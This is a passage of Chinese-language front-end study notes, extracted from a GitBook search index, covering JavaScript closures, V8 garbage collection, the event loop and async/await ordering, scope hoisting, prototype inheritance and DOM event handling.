两边条件都为 true 时，结果才为 true； 如果有一个为 false，结果就为 false； 当第一个条件为 false 时，就不再判断后面的条件 注意：当数值参与逻辑与运算时，结果为 true，那么会返回的会是第二个为真的值；如果结果为 false，返回的会是第一个为假的值。 `${false && \"adsf\"}`; // -> \"false\" false === (false && \"a\"); // -> true true && 3; // -> 3 false && 3; // -> false Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 15:48:41 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/04.函数.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/04.函数.html","title":"04.函数","keywords":"","body":"函数 JS 运行分三步： 语法分析（通篇扫描是否有语法错误），预编译（发生在函数执行的前一刻），解释执行（一行行执行）。 预编译执行分五步： 一、创建 AO 对象（Activation Object 执行期上下文） 二、找形参和变量声明，将变量和形参名作为 AO 属性名，值为 undefined. 变量声明提升（变量放到后面也不会报错，只是未定义类型）如：console.log(a);var a=10;结果 undenfined; 三、将实参值和形参统一（传参） 四、在函数体里面找到函数声明{函数声明整体提升（相当于放到程序最前面）} 五、值赋予函数体，执行（声明函数和变量的部分直接不看了） 函数作用域[[scope]] 每个 javascript 函数都是一个对象，对象中有的属性可以访问，有的不能，这些属性仅供 javascript 引擎存取，如[[scope]]。 [[scope]]就是函数的作用域，其中存储了执行期上下文的集合。 执行期上下文： 当函数执行时，会创建一个称为执行期上下文的内部对象（AO）。一个执行期上下文定义了一个函数执行时的环境，函数每次执行时对应的执行期上下文都是独一无二的，所以多次调用一个函数会导致创建多个执行期上下文，当函数执行完毕，它所产生的执行上下文被销毁。 作用域链 [[scope]]中所存储的执行期上下文对象的集合，这个集合呈链式链接，我们称这种链式链接为作用域链。查找变量时，要从作用域链的顶部开始查找。Activation Object（AO）到 Global Object（GO）。 闭包 当内部函数被保存到外部时，将会生成闭包。生成闭包后，内部函数依旧可以访问其所在的外部函数的变量。 闭包问题的解决方法：立即执行函数、let 详细解释： 当函数执行时，会创建一个称为执行期上下文的内部对象（AO），执行期上下文定义了一个函数执行时的环境。 函数还会获得它所在作用域的作用域链，是存储函数能够访问的所有执行期上下文对象的集合，即这个函数中能够访问到的东西都是沿着作用域链向上查找直到全局作用域。 函数每次执行时对应的执行期上下文都是独一无二的，当函数执行完毕，函数都会失去对这个作用域链的引用，JS 的垃圾回收机制是采用引用计数策略，如果一块内存不再被引用了那么这块内存就会被释放。 但是，当闭包存在时，即内部函数保留了对外部变量的引用时，这个作用域链就不会被销毁，此时内部函数依旧可以访问其所在的外部函数的变量，这就是闭包。 先看两个例子，两个例子都打印 5 个 5 for (var i = 0; i function test() { var a = []; for (var i = 0; i 解决方法： 使用立即执行函数 for (var i = 0; i function test() { var arr = []; for (i = 0; i 闭包-封装私有变量 function Counter() { let count = 0; this.plus = function () { return ++count; }; this.minus = function () { return --count; }; this.getCount = function () { return count; }; } const counter = new Counter(); counter.puls(); counter.puls(); console.log(counter.getCount()); 作用域与变量声明提升 在 JavaScript 中，函数声明与变量声明会被 JavaScript 引擎隐式地提升到当前作用域的顶部 声明语句中的赋值部分并不会被提升，只有名称被提升 函数声明的优先级高于变量，如果变量名跟函数名相同且未赋值，则函数声明会覆盖变量声明 如果函数有多个同名参数，那么最后一个参数（即使没有定义）会覆盖前面的同名参数 构造函数，new 时发生了什么？ var obj = {}; obj.__proto__ = Base.prototype; Base.call(obj); 创建一个新的对象 obj; 将这个空对象的proto成员指向了 Base 函数对象 prototype 成员对象 Base 函数对象的 this 指针替换成 obj, 相当于执行了 Base.call(obj); 如果构造函数显示的返回一个对象，那么则这个实例为这个返回的对象。 否则返回这个新创建的对象 函数参数是对象会发生什么问题？ function test(person) { person.age = 26; person = { name: \"yyy\", age: 30, }; return person; } const p1 = { name: \"hy\", age: 25, }; const p2 = test(p1); console.log(p1); // -> {name: \"hy\", age: 26} console.log(p2); // -> {name: \"yyy\", age: 30} person = {} 这一步操作就将应用与原来的分离了 JavaScript 中，调用函数有哪几种方式？ 方法调用模式 Foo.foo(arg1, arg2); 函数调用模式 foo(arg1, arg2); 构造器调用模式 (new Foo())(arg1, arg2); call/apply 调用模式 Foo.foo.call(that, arg1, arg2); bind 调用模式 Foo.foo.bind(that)(arg1, arg2)(); 如何实现一个 new? function _new(func, ...args) { let obj = Object.create(func.prototype); // 原型 let res = func.apply(obj, args); // 初始化对象属性 return res instanceof Object ? res : obj; // 返回值 } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 15:48:40 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/05.垃圾回收与内存泄露和优化.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/05.垃圾回收与内存泄露和优化.html","title":"05.垃圾回收与内存泄露和优化","keywords":"","body":"【V8 引擎】浅析 Chrome V8 引擎中的垃圾回收机制和内存泄露优化策略 垃圾回收机制 如何判断回收内容 如何确定哪些内存需要回收，哪些内存不需要回收，这是垃圾回收期需要解决的最基本问题。我们可以这样假定，一个对象为活对象当且仅当它被一个根对象 或另一个活对象指向。根对象永远是活对象，它是被浏览器或 V8 所引用的对象。被局部变量所指向的对象也属于根对象，因为它们所在的作用域对象被视为根对 象。全局对象（Node 中为 global，浏览器中为 window）自然是根对象。浏览器中的 DOM 元素也属于根对象。 V8 回收策略 新生代的对象为存活时间较短的对象，老生代中的对象为存活时间较长或常驻内存的对象。分别对新生代和老生代使用 不同的垃圾回收算法来提升垃圾回收的效率。对象起初都会被分配到新生代，当新生代中的对象满足某些条件（后面会有介绍）时，会被移动到老生代（晋升）。 新生代算法 在新生代空间中，内存空间分为两部分，分别为 From 空间和 To 空间。在这两个空间中，必定有一个空间是使用的，另一个空间是空闲的。新分配的对象会被放入 From 空间中，当 From 空间被占满时，新生代 GC 就会启动了。算法会检查 From 空间中存活的对象并复制到 To 空间中，如果有失活的对象就会销毁。当复制完成后将 From 空间和 To 空间互换，这样 GC 就结束了。 老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。 在讲算法前，先来说下什么情况下对象会出现在老生代空间中： 新生代中的对象是否已经经历过一次 Scavenge 算法，如果经历过的话，会将对象从新生代空间移到老生代空间中。 To 空间的对象占比大小超过 25 %。在这种情况下，为了不影响到内存分配，会将对象从新生代空间移到老生代空间中。 内存泄露和优化 什么是内存泄露？ 存泄露是指程序中已分配的堆内存由于某种原因未释放或者无法释放，造成系统内存的浪费，导致程序运行速度减慢甚至系统奔溃等后果。 常见的内存泄露的场景 缓存 作用域未释放（闭包） 没有必要的全局变量 无效的 DOM 引用 定时器未清除 事件监听为空白 内存泄露优化 在业务不需要的用到的内部函数，可以重构到函数外，实现解除闭包。 避免创建过多的生命周期较长的对象，或者将对象分解成多个子对象。 避免过多使用闭包。 注意清除定时器和事件监听器。 nodejs 中使用 stream 或 buffer 来操作大文件，不会受 nodejs 内存限制。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 14:19:04 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/06.事件.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/06.事件.html","title":"06.事件","keywords":"","body":"事件机制 事件触发三阶段 事件触发有三个阶段： window 往事件触发处传播，遇到注册的捕获事件会触发 传播到事件触发处时触发注册的事件 从事件触发处往 window 传播，遇到注册的冒泡事件会触发 事件触发一般来说会按照上面的顺序进行，但是也有特例，如果给一个 body 中的子节点同时注册冒泡和捕获事件，事件触发会按照注册的顺序执行。 注册事件 通常使用 addEventListener 注册事件，该函数的第三个参数可以是布尔值，也可以是对象。第三个参数默认值为 false，决定了注册的事件是捕获事件（ture 为）还是冒泡事件。 一般来说，如果我们只希望事件只触发在目标上，这时候可以使用 stopPropagation 来阻止事件的进一步传播。通常我们认为 stopPropagation 是用来阻止事件冒泡的，其实该函数也可以阻止捕获事件。stopImmediatePropagation 同样也能实现阻止事件，但是还能阻止该事件目标执行别的注册事件。 target 和 currentTarget 在了解上述的事件传递的三个阶段后，我们来梳理事件对象中容易混淆的两个属性：target 和 currentTarget 。 target 是触发事件的某个具体的对象，只会出现在事件机制的目标阶段，即“谁触发了事件，谁就是 target ”。 currentTarget 是绑定事件的对象。 取消默认操作 取消默认操作 w3c 的方法是 e.preventDefault()，IE 则是使用 e.returnValue = false; function cancelHandler(event) { var event = event || window.event; //用于IE if (event.preventDefault) event.preventDefault(); //标准技术 if (event.returnValue) event.returnValue = false; //IE return false; //用于处理使用对象属性注册的处理程序 } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 15:48:39 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/07.事件队列.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/07.事件队列.html","title":"07.事件队列","keywords":"","body":"为什么 JavaScript 是单线程？ JavaScript 语言的一大特点就是单线程，也就是说，同一个时间只能做一件事。那么，为什么 JavaScript 不能有多个线程呢？这样能提高效率啊。 JavaScript 的单线程，与它的用途有关。作为浏览器脚本语言，JavaScript 的主要用途是与用户互动，以及操作 DOM。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，假定 JavaScript 同时有两个线程，一个线程在某个 DOM 节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？ 所以，为了避免复杂性，从一诞生，JavaScript 就是单线程，这已经成了这门语言的核心特征，将来也不会改变。 为了利用多核 CPU 的计算能力，HTML5 提出 Web Worker 标准。允许 JavaScript 脚本创建多个线程，但是子线程完全受主线程控制，且不得操作 DOM。所以，这个新标准并没有改变 JavaScript 单线程的本质。 Event Loop 参考地址:Event Loop 这个循环你晓得么？(附 GIF 详解)-饿了么前端 任务队列的本质 所有同步任务都在主线程上执行，形成一个执行栈（execution context stack）。 主线程之外，还存在一个”任务队列”（task queue）。只要异步任务有了运行结果，就在”任务队列”之中放置一个事件。 一旦”执行栈”中的所有同步任务执行完毕，系统就会读取”任务队列”，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。 主线程不断重复上面的第三步。 异步任务 setTimeOut、setInterval DOM 事件 Promise JavaScript 实现异步编程的方法？ 回调函数 事件监听 发布/订阅 Promises 对象 Async 函数[ES7] 关于 setTimeOut、setImmediate、process.nextTick()的比较 setTimeout() 将事件插入到了事件队列，必须等到当前代码（执行栈）执行完，主线程才会去执行它指定的回调函数。 当主线程时间执行过长，无法保证回调会在事件指定的时间执行。 浏览器端每次 setTimeout 会有 4ms 的延迟，当连续执行多个 setTimeout，有可能会阻塞进程，造成性能问题。 setImmediate() 事件插入到事件队列尾部，主线程和事件队列的函数执行完成之后立即执行。和 setTimeout(fn,0)的效果差不多。 服务端 node 提供的方法。浏览器端最新的 api 也有类似实现:window.setImmediate,但支持的浏览器很少。 process.nextTick() 插入到事件队列尾部，但在下次事件队列之前会执行。也就是说，它指定的任务总是发生在所有异步任务之前，当前主线程的末尾。 大致流程：当前”执行栈”的尾部–>下一次 Event Loop（主线程读取”任务队列”）之前–>触发 process 指定的回调函数。 服务器端 node 提供的办法。用此方法可以用于处于异步延迟的问题。 可以理解为：此次不行，预约下次优先执行。 浏览器的 Tasks、microtasks、 queues 和 schedules Promise Promise 本身是同步的立即执行函数， 当在 executor 中执行 resolve 或者 reject 的时候, 此时是异步操作， 会先执行 then/catch 等，当主栈完成后，才会去调用 resolve/reject 中存放的方法执行，打印 p 的时候，是打印的返回结果，一个 Promise 实例。 async await Async/Await 就是一个自执行的 generate 函数。利用 generate 函数的特性把异步的代码写成“同步”的形式。 async 函数返回一个 Promise 对象，当函数执行的时候，一旦遇到 await 就会先返回，等到触发的异步操作完成，再执行函数体内后面的语句。可以理解为，是让出了线程，跳出了 async 函数体。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 14:13:23 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/08.事件轮询机制.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/08.事件轮询机制.html","title":"08.事件轮询机制","keywords":"","body":"从一道题浅说 JavaScript 的事件循环 原文链接： https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/7 注：本篇文章运行环境为当前最新版本的谷歌浏览器（72.0.3626.109） 任务队列 首先我们需要明白以下几件事情： JS 分为同步任务和异步任务 同步任务都在主线程上执行，形成一个执行栈 主线程之外，事件触发线程管理着一个任务队列，只要异步任务有了运行结果，就在任务队列之中放置一个事件。 一旦执行栈中的所有同步任务执行完毕（此时 JS 引擎空闲），系统就会读取任务队列，将可运行的异步任务添加到可执行栈中，开始执行。 根据规范，事件循环是通过任务队列的机制来进行协调的。一个 Event Loop 中，可以有一个或者多个任务队列(task queue)，一个任务队列便是一系列有序任务(task)的集合；每个任务都有一个任务源(task source)，源自同一个任务源的 task 必须放到同一个任务队列，从不同源来的则被添加到不同队列。 setTimeout/Promise 等 API 便是任务源，而进入任务队列的是他们指定的具体执行任务。 宏任务 (macro)task（又称之为宏任务），可以理解是每次执行栈执行的代码就是一个宏任务（包括每次从事件队列中获取一个事件回调并放到执行栈中执行）。 浏览器为了能够使得 JS 内部(macro)task 与 DOM 任务能够有序的执行，会在一个(macro)task 执行结束后，在下一个(macro)task 执行开始前，对页面进行重新渲染，流程如下： (macro)task->渲染->(macro)task->... (macro)task 主要包含：script(整体代码)、setTimeout、setInterval、I/O、UI 交互事件、postMessage、MessageChannel、setImmediate(Node.js 环境) 微任务 microtask（又称为微任务），可以理解是在当前 task 执行结束后立即执行的任务。也就是说，在当前 task 任务后，下一个 task 之前，在渲染之前。 所以它的响应速度相比 setTimeout（setTimeout 是 task）会更快，因为无需等渲染。也就是说，在某一个 macrotask 执行完后，就会将在它执行期间产生的所有 microtask 都执行完毕（在渲染前）。 microtask 主要包含：Promise.then、MutaionObserver、process.nextTick(Node.js 环境) 运行机制 在事件循环中，每进行一次循环操作称为 tick，每一次 tick 的任务处理模型是比较复杂的，但关键步骤如下： 执行一个宏任务（栈中没有就从事件队列中获取） 执行过程中如果遇到微任务，就将它添加到微任务的任务队列中 宏任务执行完毕后，立即执行当前微任务队列中的所有微任务（依次执行） 当前宏任务执行完毕，开始检查渲染，然后 GUI 线程接管渲染 渲染完毕后，JS 线程继续接管，开始下一个宏任务（从事件队列中获取） 流程图如下： Promise 和 async 中的立即执行 我们知道 Promise 中的异步体现在then和catch中，所以写在 Promise 中的代码是被当做同步任务立即执行的。而在 async/await 中，在出现 await 出现之前，其中的代码也是立即执行的。那么出现了 await 时候发生了什么呢？ await 做了什么 从字面意思上看 await 就是等待，await 等待的是一个表达式，这个表达式的返回值可以是一个 promise 对象也可以是其他值。 很多人以为 await 会一直等待之后的表达式执行完之后才会继续执行后面的代码，实际上 await 是一个让出线程的标志。await 后面的表达式会先执行一遍，将 await 后面的代码加入到 microtask 中，然后就会跳出整个 async 函数来执行后面的代码。 这里感谢@chenjigeng的纠正： 由于因为 async await 本身就是 promise+generator 的语法糖。所以 await 后面的代码是 microtask。所以对于本题中的 async function async1() { console.log(\"async1 start\"); await async2(); console.log(\"async1 end\"); } 等价于 async function async1() { console.log('async1 start'); Promise.resolve(async2()).then(() ={ console.log('async1 end'); }) } 回到本题 //请写出输出内容 async function async1() { console.log(\"async1 start\"); await async2(); console.log(\"async1 end\"); } async function async2() { console.log(\"async2\"); } console.log(\"script start\"); // 1 setTimeout(function () { console.log(\"setTimeout\"); }, 0); async1(); new Promise(function (resolve) { console.log(\"promise1\"); resolve(); }).then(function () { console.log(\"promise2\"); }); console.log(\"script end\"); /* script start async1 start async2 promise1 script end async1 end promise2 setTimeout */ 这道题主要考察的是事件循环中函数执行顺序的问题，其中包括async ，await，setTimeout，Promise函数。下面来说一下本题中涉及到的知识点。 以上就本道题涉及到的所有相关知识点了，下面我们再回到这道题来一步一步看看怎么回事儿。 首先，事件循环从宏任务(macrotask)队列开始，这个时候，宏任务队列中，只有一个 script(整体代码)任务；当遇到任务源(task source)时，则会先分发任务到对应的任务队列中去。所以，上面例子的第一步执行如下图所示： 然后我们看到首先定义了两个 async 函数，接着往下看，然后遇到了 console 语句，直接输出 script start。输出之后，script 任务继续往下执行，遇到 setTimeout，其作为一个宏任务源，则会先将其任务分发到对应的队列中： script 任务继续往下执行，执行了 async1()函数，前面讲过 async 函数中在 await 之前的代码是立即执行的，所以会立即输出async1 start。遇到了 await 时，会将 await 后面的表达式执行一遍，所以就紧接着输出async2，然后将 await 后面的代码也就是console.log('async1 end')加入到 microtask 中的 Promise 队列中，接着跳出 async1 函数来执行后面的代码。 script 任务继续往下执行，遇到 Promise 实例。由于 Promise 中的函数是立即执行的，而后续的 .then 则会被分发到 microtask 的 Promise 队列中去。所以会先输出 promise1，然后执行 resolve，将 promise2 分配到对应队列。 script 任务继续往下执行，最后只有一句输出了 script end，至此，全局任务就执行完毕了。 根据上述，每次执行完一个宏任务之后，会去检查是否存在 Microtasks；如果有，则执行 Microtasks 直至清空 Microtask Queue。 因而在 script 任务执行完毕之后，开始查找清空微任务队列。此时，微任务中， Promise 队列有的两个任务async1 end和promise2，因此按先后顺序输出 async1 end，promise2。当所有的 Microtasks 执行完毕之后，表示第一轮的循环就结束了。 第二轮循环开始，这个时候就会跳回 async1 函数中执行后面的代码，然后遇到了同步任务 console 语句，直接输出 async1 end。这样第二轮的循环就结束了。（也可以理解为被加入到 script 任务队列中，所以会先与 setTimeout 队列执行） 第二轮循环依旧从宏任务队列开始。此时宏任务中只有一个 setTimeout，取出直接输出即可，至此整个流程结束。 下面我会改变一下代码来加深印象。 变式一 在第一个变式中我将 async2 中的函数也变成了 Promise 函数，代码如下： async function async1() { console.log(\"async1 start\"); await async2(); console.log(\"async1 end\"); } async function async2() { //async2做出如下更改： new Promise(function (resolve) { console.log(\"promise1\"); resolve(); }).then(function () { console.log(\"promise2\"); }); } console.log(\"script start\"); setTimeout(function () { console.log(\"setTimeout\"); }, 0); async1(); new Promise(function (resolve) { console.log(\"promise3\"); resolve(); }).then(function () { console.log(\"promise4\"); }); console.log(\"script end\"); 可以先自己看看输出顺序会是什么，下面来公布结果： script start async1 start promise1 promise3 script end promise2 async1 end promise4 setTimeout 在第一次 macrotask 执行完之后，也就是输出script end之后，会去清理所有 microtask。所以会相继输出promise2， async1 end ，promise4，其余不再多说。 变式二 在第二个变式中，我将 async1 中 await 后面的代码和 async2 的代码都改为异步的，代码如下： async function async1() { console.log(\"async1 start\"); await async2(); //更改如下： setTimeout(function () { console.log(\"setTimeout1\"); }, 0); } async function async2() { //更改如下： setTimeout(function () { console.log(\"setTimeout2\"); }, 0); } console.log(\"script start\"); setTimeout(function () { console.log(\"setTimeout3\"); }, 0); async1(); new Promise(function (resolve) { console.log(\"promise1\"); resolve(); }).then(function () { console.log(\"promise2\"); }); console.log(\"script end\"); 可以先自己看看输出顺序会是什么，下面来公布结果： script start async1 start promise1 script end promise2 setTimeout3 setTimeout2 setTimeout1 在输出为promise2之后，接下来会按照加入 setTimeout 队列的顺序来依次输出，通过代码我们可以看到加入顺序为3 2 1，所以会按 3，2，1 的顺序来输出。 变式三 变式三是我在一篇面经中看到的原题，整体来说大同小异，代码如下： async function a1 () { console.log('a1 start') await a2() console.log('a1 end') } async function a2 () { console.log('a2') } console.log('script start') setTimeout(() ={ console.log('setTimeout') }, 0) Promise.resolve().then(() ={ console.log('promise1') }) a1() let promise2 = new Promise((resolve) ={ resolve('promise2.then') console.log('promise2') }) promise2.then((res) ={ console.log(res) Promise.resolve().then(() ={ console.log('promise3') }) }) console.log('script end') 无非是在微任务那块儿做点文章，前面的内容如果你都看懂了的话这道题一定没问题的，结果如下： script start a1 start a2 promise2 script end promise1 a1 end promise2.then promise3 setTimeout 参考文章 从一道题浅说 JavaScript 的事件循环 async/await 执行顺序详解 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 14:31:53 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/09.作用域.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/09.作用域.html","title":"09.作用域","keywords":"","body":"作用域相关问题 下面的代码打印什么内容，为什么？ // 情况 1 // 情况 2 var b = 10; var c = function b() { b = 20; console.log(b) } c() // 上面两种都打印： ƒ b() { b = 20; console.log(b) } b 函数（函数表达式定义函数）是一个相当于用 const 定义的常量，内部无法进行重新赋值，如果在严格模式下，会报错\"Uncaught TypeError: Assignment to constant variable.\" 简单改造下面的代码，使之分别打印 10 和 20 var b = 10; (function b() { b = 20; console.log(b); })(); 打印 10： var b = 10; (function b(b) { window.b = 20; console.log(b); })(b); var b = 10; (function b() { b.b = 20; console.log(b); })(); 打印 20： var b = 10; (function b(b) { b = 20; console.log(b); })(); var b = 10; (function b() { var b = 20; console.log(b); })(); 下面代码输出什么 var a = 10; (function () { console.log(a); a = 5; console.log(window.a); var a = 20; console.log(a); })(); 依次输出：undefined -> 10 -> 20 解析： 在立即执行函数中，var a = 20; 语句定义了一个局部变量 a，由于 js 的变量声明提升机制，局部变量 a 的声明会被提升至立即执行函数的函数体最上方，且由于这样的提升并不包括赋值，因此第一条打印语句会打印 undefined，最后一条语句会打印 20。 由于全局的 var 会挂载到 window 对象下，并且立即执行函数里面有变量提示。 ‘a = 5;’这条语句执行时，局部的变量 a 已经声明，因此它产生的效果是对局部的变量 a 赋值，此时 window.a 依旧是最开始赋值的 10 var 变量定义提升 var name = \"Tom\"; (function () { if (typeof name == \"undefined\") { var name = \"Jack\"; console.log(\"Goodbye \" + name); } else { console.log(\"Hello \" + name); } })(); 输出： 'Goodbye Jack' Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 15:48:38 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/10.原型链与继承.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/10.原型链与继承.html","title":"10.原型链与继承","keywords":"","body":"创建对象的方法 字面量创建 构造函数创建 Object.create() var o1 = { name: \"value\" }; var o2 = new Object({ name: \"value\" }); var M = function () { this.name = \"o3\"; }; var o3 = new M(); var P = { name: \"o4\" }; var o4 = Object.create(P); 原型 JavaScript 的所有对象中都包含了一个 __proto__ 内部属性，这个属性所对应的就是该对象的原型 JavaScript 的函数对象，除了原型 __proto__ 之外，还预置了 prototype 属性 当函数对象作为构造函数创建实例时，该 prototype 属性值将被作为实例对象的原型 __proto__。 原型链 任何一个实例对象通过原型链可以找到它对应的原型对象，原型对象上面的实例和方法都是实例所共享的。 一个对象在查找以一个方法或属性时，他会先在自己的对象上去找，找不到时，他会沿着原型链依次向上查找。 注意： 函数才有 prototype，实例对象只有有proto， 而函数有的proto是因为函数是 Function 的实例对象 instanceof 原理 判断实例对象的proto属性与构造函数的 prototype 是不是用一个引用。如果不是，他会沿着对象的proto向上查找的，直到顶端 Object。 判断对象是哪个类的直接实例 使用对象.construcor直接可判断 构造函数，new 时发生了什么？ var obj = {}; obj.__proto__ = Base.prototype; Base.call(obj); 创建一个新的对象 obj; 将这个空对象的proto成员指向了 Base 函数对象 prototype 成员对象 Base 函数对象的 this 指针替换成 obj, 相当于执行了 Base.call(obj); 如果构造函数显示的返回一个对象，那么则这个实例为这个返回的对象。 否则返回这个新创建的对象 类 类的声明 // 普通写法 function Animal() { this.name = \"name\"; } // ES6 class Animal2 { constructor() { this.name = \"name\"; } } 继承 借用构造函数法 在构造函数中 使用Parent.call(this)的方法继承父类属性。 原理： 将子类的 this 使用父类的构造函数跑一遍 缺点： Parent 原型链上的属性和方法并不会被子类继承 function Parent() { this.name = \"parent\"; } function Child() { Parent.call(this); this.type = \"child\"; } 原型链实现继承 原理：把子类的 prototype（原型对象）直接设置为父类的实例 缺点：因为子类只进行一次原型更改，所以子类的所有实例保存的是同一个父类的值。 当子类对象上进行值修改时，如果是修改的原始类型的值，那么会在实例上新建这样一个值； 但如果是引用类型的话，他就会去修改子类上唯一一个父类实例里面的这个引用类型，这会影响所有子类实例 function Parent() { this.name = \"parent\"; this.arr = [1, 2, 3]; } function Child() { this.type = \"child\"; } Child.prototype = new Parent(); var c1 = new Child(); var c2 = new Child(); c1.__proto__ === c2.__proto__; 组合继承方式 组合构造函数中使用 call 继承和原型链继承。 原理： 子类构造函数中使用Parent.call(this);的方式可以继承写在父类构造函数中 this 上绑定的各属性和方法； 使用Child.prototype = new Parent()的方式可以继承挂在在父类原型上的各属性和方法 缺点： 父类构造函数在子类构造函数中执行了一次，在子类绑定原型时又执行了一次 function Parent() { this.name = \"parent\"; this.arr = [1, 2, 3]; } function Child() { Parent.call(this); this.type = \"child\"; } Child.prototype = new Parent(); 组合继承方式 优化 1： 因为这时父类构造函数的方法已经被执行过了，只需要关心原型链上的属性和方法了 Child.prototype = Parent.prototype; 缺点： 因为原型上有一个属性为constructor，此时直接使用父类的 prototype 的话那么会导致 实例的 constructor 为 Parent，即不能区分这个实例对象是 Child 的实例还是父类的实例对象。 子类不可直接在 prototype 上添加属性和方法，因为会影响父类的原型 注意：这个时候 instanseof 是可以判断出实例为 Child 的实例的，因为 instanceof 的原理是沿着对象的proto判断是否有一个原型是等于该构造函数的原型的。这里把 Child 的原型直接设置为了父类的原型，那么: 实例.proto === Child.prototype === Parent.prototype 组合继承方式 优化 2 - 添加中间对象【最通用版本】： function Parent() { this.name = \"parent\"; this.arr = [1, 2, 3]; } function Child() { Parent.call(this); this.type = \"child\"; } Child.prototype = Object.create(Parent.prototype); //提供__proto__ Child.prototype.constrctor = Child; Object.create()方法创建一个新对象，使用现有的对象来提供新创建的对象的proto 封装一个原生的继承方法 /** * 继承 * @param Parent * @param Child */ function extendsClass(Parent, Child) { function F() {} F.prototype = Parent.prototype; Child.prototype = new F(); Child.prototype.constrctor = Child; return Child; } ES5/ES6 的继承除了写法以外还有什么区别？ class 声明会提升，但不会初始化赋值。Foo 进入暂时性死区，类似于 let、const 声明变量。 class 声明内部会启用严格模式。 class 的所有方法（包括静态方法和实例方法）都是不可枚举的。 class 的所有方法（包括静态方法和实例方法）都没有原型对象 prototype，所以也没有[[construct]]，不能使用 new 来调用。 必须使用 new 调用 class。 class 内部无法重写类名。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 15:48:38 "},"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/11.DOM.html":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/03.JavaScript/11.DOM.html","title":"11.DOM","keywords":"","body":"DOM DOM 事件的级别 DOM 事件模型 DOM 事件流 DOM 事件捕获的具体流程 Event 对象的常见应用 自定义事件 DOM 概述 | MDN DOM | MDN DOM 操作 DOM 事件级别 DOM0 onXXX 类型的定义事件 element.onclick = function(e) { ... } DOM2 addEventListener 方式 element.addEventListener('click', function (e) { ... }) btn.removeEventListener('click', func, false) btn.attachEvent(\"onclick\", func); btn.detachEvent(\"onclick\", func); DOM3 增加了很多事件类型 element.addEventListener('keyup', function (e) { ... }) eventUtil 是自定义对象，textInput 是 DOM3 级事件 DOM 事件模型 捕获从上到下， 冒泡从下到上。 先捕获，再到目标，再冒泡 DOM 事件流 DOM 标准采用捕获+冒泡。两种事件流都会触发 DOM 的所有对象，从 window 对象开始，也在 window 对象结束。 DOM 标准规定事件流包括三个阶段： 事件捕获阶段 处于目标阶段 事件冒泡阶段 描述 DOM 事件捕获的具体流程 从 window -> document -> html -> body -> ... -> 目标元素 Event 对象常见应用 event.target 触发事件的元素 event.currentTarget 绑定事件的元素 event.preventDefault() 阻止默认行为 event.cancelBubble()和 event.preventBubble 都已经废弃 event.stopPropagation() 阻止在捕获阶段或冒泡阶段继续传播，而不是阻止冒泡 event.stopImmediatePropagation() 阻止事件冒泡并且阻止相同事件的其他侦听器被调用。 事件的代理/委托 事件委托是指将事件绑定目标元素的到父元素上，利用冒泡机制触发该事件 优点： 可以减少事件注册，节省大量内存占用 可以将事件应用于动态添加的子元素上 但使用不当会造成事件在不应该触发时触发 ulEl.addEventListener( \"click\", function (event) { var target = event.target || event.srcElement; if (target && target.nodeName.toUpperCase() === \"LI\") { console.log(target.innerHTML); } }, false ); 自定义事件 Event CustomEvent CustomEvent 不仅可以用来做自定义事件，还可以在后面跟一个 object 做参数 var evt = new Event(\"myEvent\"); someDom.addEventListener(\"myEvent\", function () { //处理这个自定义事件 }); someDom.dispatchEvent(evt); IE 与火狐的事件机制有什么区别？ 如何阻止冒泡？ IE 只事件冒泡，不支持事件捕获；火狐同时支持件冒泡和事件捕获。 阻止冒泡： 取消默认操作 w3c 的方法是 e.preventDefault() IE 则是使用 e.returnValue = false; return false javascript 的 return false 只会阻止默认行为 是用 jQuery 的话则既阻止默认行为又防止对象冒泡。 阻止冒泡 w3c 的方法是 e.stopPropagation() IE 则是使用 e.cancelBubble = true [js] view plaincopy function stopHandler(event) window.event ? window.event.cancelBubble = true : event.stopPropagation(); } DOM 元素的 dom.getAttribute(propName)和 dom.propName 有什么区别和联系 dom.getAttribute()，是标准 DOM 操作文档元素属性的方法，具有通用性可在任意文档上使用，返回元素在源文件中设置的属性 dom.propName 通常是在 HTML 文档中访问特定元素的特性，浏览器解析元素后生成对应对象（如 a 标签生成 HTMLAnchorElement），这些对象的特性会根据特定规则结合属性设置得到，对于没有对应特性的属性，只能使用 getAttribute 进行访问 dom.getAttribute()返回值是源文件中设置的值，类型是字符串或者 null（有的实现返回\"\"） dom.propName 返回值可能是字符串、布尔值、对象、undefined 等 大部分 attribute 与 property 是一一对应关系，修改其中一个会影响另一个，如 id，title 等属性 一些布尔属性的检测设置需要 hasAttribute 和 removeAttribute 来完成，或者设置对应 property 像link中 href 属性，转换成 property 的时候需要通过转换得到完整 URL 一些 attribute 和 